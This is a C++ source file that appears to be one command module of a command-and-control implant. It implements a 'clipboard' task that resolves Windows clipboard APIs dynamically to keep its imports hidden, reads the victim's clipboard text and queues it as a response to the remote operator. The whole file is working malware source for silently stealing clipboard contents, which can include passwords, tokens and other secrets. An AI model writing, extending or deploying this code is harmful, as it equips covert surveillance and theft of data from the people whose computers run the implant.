#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_CLIPBOARD

using namespace stardust;
using namespace starburst;

typedef BOOL    (WINAPI *fn_OpenClipboard)( HWND );
typedef BOOL    (WINAPI *fn_CloseClipboard)( void );
typedef HANDLE  (WINAPI *fn_GetClipboardData)( UINT );
typedef LPVOID  (WINAPI *fn_GlobalLock)( HGLOBAL );
typedef BOOL    (WINAPI *fn_GlobalUnlock)( HGLOBAL );
typedef BOOL    (WINAPI *fn_IsClipboardFormatAvailable)( UINT );

#define CF_UNICODETEXT_VAL 13

auto declfn starburst::cmd_clipboard(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    (void)params;

    auto h_user32 = inst.kernel32.LoadLibraryA( symbol<const char*>( "user32.dll" ) );
    if ( !h_user32 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
        return;
    }

    auto k32 = (HMODULE)inst.kernel32.handle;

    auto pOpenClipboard = reinterpret_cast<fn_OpenClipboard>(
        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "OpenClipboard" ) ) );
    auto pCloseClipboard = reinterpret_cast<fn_CloseClipboard>(
        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "CloseClipboard" ) ) );
    auto pGetClipboardData = reinterpret_cast<fn_GetClipboardData>(
        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "GetClipboardData" ) ) );
    auto pIsClipboardFormatAvailable = reinterpret_cast<fn_IsClipboardFormatAvailable>(
        inst.kernel32.GetProcAddress( h_user32, symbol<LPCSTR>( "IsClipboardFormatAvailable" ) ) );
    auto pGlobalLock = reinterpret_cast<fn_GlobalLock>(
        inst.kernel32.GetProcAddress( k32, symbol<LPCSTR>( "GlobalLock" ) ) );
    auto pGlobalUnlock = reinterpret_cast<fn_GlobalUnlock>(
        inst.kernel32.GetProcAddress( k32, symbol<LPCSTR>( "GlobalUnlock" ) ) );

    if ( !pOpenClipboard || !pCloseClipboard || !pGetClipboardData ||
         !pIsClipboardFormatAvailable || !pGlobalLock || !pGlobalUnlock ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
        return;
    }

    if ( !pOpenClipboard( nullptr ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenClipboard failed" ) ) );
        return;
    }

    if ( !pIsClipboardFormatAvailable( CF_UNICODETEXT_VAL ) ) {
        pCloseClipboard();
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "No text data" ) ) );
        return;
    }

    HANDLE h_data = pGetClipboardData( CF_UNICODETEXT_VAL );
    if ( !h_data ) {
        pCloseClipboard();
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "Clipboard empty" ) ) );
        return;
    }

    auto w_text = reinterpret_cast<wchar_t*>( pGlobalLock( h_data ) );
    if ( !w_text ) {
        pCloseClipboard();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GlobalLock failed" ) ) );
        return;
    }

    // determine needed buffer size
    int needed = inst.kernel32.WideCharToMultiByte( CP_ACP, 0, w_text, -1, nullptr, 0, nullptr, nullptr );
    if ( needed <= 0 ) {
        pGlobalUnlock( h_data );
        pCloseClipboard();
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "Clipboard empty" ) ) );
        return;
    }

    auto output = static_cast<char*>( inst.heap_alloc( needed + 1 ) );
    if ( !output ) {
        pGlobalUnlock( h_data );
        pCloseClipboard();
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, w_text, -1, output, needed, nullptr, nullptr );
    output[needed] = '\0';

    pGlobalUnlock( h_data );
    pCloseClipboard();

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
